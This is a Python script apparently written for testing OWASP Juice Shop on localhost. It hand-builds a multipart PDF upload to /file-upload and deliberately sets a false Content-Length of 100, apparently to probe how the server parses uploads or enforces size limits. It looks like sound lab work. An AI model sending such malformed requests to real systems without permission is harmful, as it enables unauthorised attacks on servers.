import socket
import os
import sys

host = "127.0.0.1"
port = 3000

token = "..."

file_path = "/home/stefan/Downloads/Template_Performance Review.pdf"
filename = os.path.basename(file_path)
boundary = "----JuiceShopBoundary7MA4YWxkTrZu0gW"
max_file_size = 200000000  # Juice Shop multer limit (server.ts)

file_size = os.path.getsize(file_path)
if file_size > max_file_size:
    print(
        f"File too large: {file_size} bytes > {max_file_size} bytes. "
        "Choose a smaller file or raise the multer limit in server.ts."
    )
    sys.exit(1)

with open(file_path, "rb") as f:
    file_bytes = f.read()

# Multipart body parts (as bytes)
body_parts = []
body_parts.append(
    (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        "Content-Type: application/pdf\r\n"
        "\r\n"
    ).encode("utf-8")
)
body_parts.append(file_bytes)
body_parts.append(f"\r\n--{boundary}--\r\n".encode("utf-8"))

body = b"".join(body_parts)
# content_length = len(body)
content_length = 100

request = (
    "POST /file-upload HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Authorization: Bearer {token}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {content_length}\r\n"
    "Connection: close\r\n"
    "\r\n"
).encode("utf-8") + body

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(request)

    response = b""
    while True:
        chunk = s.recv(64)
        if not chunk:
            break
        response += chunk

print(response.decode(errors="ignore"))
